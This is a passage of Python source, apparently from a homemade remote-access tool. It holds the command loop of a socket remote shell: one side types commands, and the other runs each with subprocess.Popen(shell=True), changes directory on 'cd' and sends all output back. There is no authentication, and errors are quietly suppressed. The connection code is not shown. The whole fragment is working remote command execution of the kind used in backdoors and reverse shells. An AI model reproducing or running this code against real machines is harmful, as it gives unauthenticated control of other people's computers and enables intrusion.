if isclient == False:
    print(Fore.RESET)
    while True:
        directory = receive(client).decode('utf-8')
        cmd = input(str(directory) + '\\~$ ')
        if cmd == '' or cmd == ' ' or not cmd:
            pass
        elif cmd == 'exit':
            send(client, b'exit')
            break
        elif cmd == 'cls':
            os.system('cls')
            send(client, b'cls')
            none = receive(client)
        else:
            send(client, str(cmd).encode('utf-8'))
            response = receive(client)
            print(response.decode('utf-8'))
else:
    while True:
        path = os.getcwd().encode('utf-8')
        send(server, path)
        cmd = receive(server)
        cmd = cmd.decode('utf-8')
        try:
            if cmd == '' or cmd == ' ' or not cmd:
                pass
            elif cmd == 'exit':
                break
            elif cmd.split()[0] == 'cd':
                try:
                    os.chdir(cmd.split()[1])
                    send(server, b' ')
                except:
                    send(server, b'The system cannot find the path specified.')
            else:
                PIPE = subprocess.PIPE
                result = subprocess.Popen(str(cmd), shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
                output, error = result.communicate()
                output = output.decode('utf-8')
                error = error.decode('utf-8')
                output = str(output) + str(error)
                if output == '' or output == '\n' or not output:
                    output = ' '
                output = output.encode('utf-8')
                send(server, output)
        except:
            pass